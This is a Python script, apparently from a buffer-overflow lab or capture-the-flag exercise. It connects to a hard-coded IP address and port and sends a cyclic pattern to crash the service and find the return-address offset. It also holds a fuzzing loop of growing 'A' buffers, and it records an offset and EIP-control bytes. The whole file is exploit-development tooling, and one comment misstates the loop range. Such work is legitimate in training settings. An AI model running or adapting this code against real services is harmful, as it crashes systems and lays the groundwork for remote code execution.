import socket
import time

HOST = '104.198.232.26'  # Replace with the actual server IP
PORT = 32074            # Replace with the actual server port
offset = 1174
eip_control = b"BBBB"


def connect_and_send(payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        
        # Receive initial banner/paragraph
        initial_data = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Initial server response:\n{str(initial_data)}")

        # Send the payload
        print(f"Sending payload of length: {len(payload)}")
        s.sendall(payload.encode("utf-8"))
        
        # Wait a bit to see server reaction
        time.sleep(0.5)

        # Try to receive subsequent data (if any)
        try:
            response = s.recv(4096).decode('utf-8', errors='ignore')
            print(f"\nServer response after payload:\n{str(response)}")
        except socket.timeout:
            print("No immediate response after sending payload (might be crashed or closed).")

        #s.close()
        #print("Connection closed.\n")
        return True # Connection was successful, even if it closed afterwards
    except ConnectionResetError:
        print(f"Connection reset by peer at length {len(payload)}. Likely a crash!")
        return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False



# Crash Payload Test
def crashTest():
    payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0B"
    connect_and_send(payload)

# Fuzzing loop
def fuzz():
    for length in range(1150, 1250, 1): # Start from 1, go up to 2000, increment by 50
        buffer = "A" * length
        print(f"Testing with {length} 'A's...")
        if not connect_and_send(buffer):
            print(f"Server likely crashed at or around {length} bytes.")
            break
        time.sleep(1) # Give the server a moment if it's recovering

# You can refine the range after the initial crash point is found
# For example, if it crashes at 1000, try range(900, 1100, 1)
crashTest()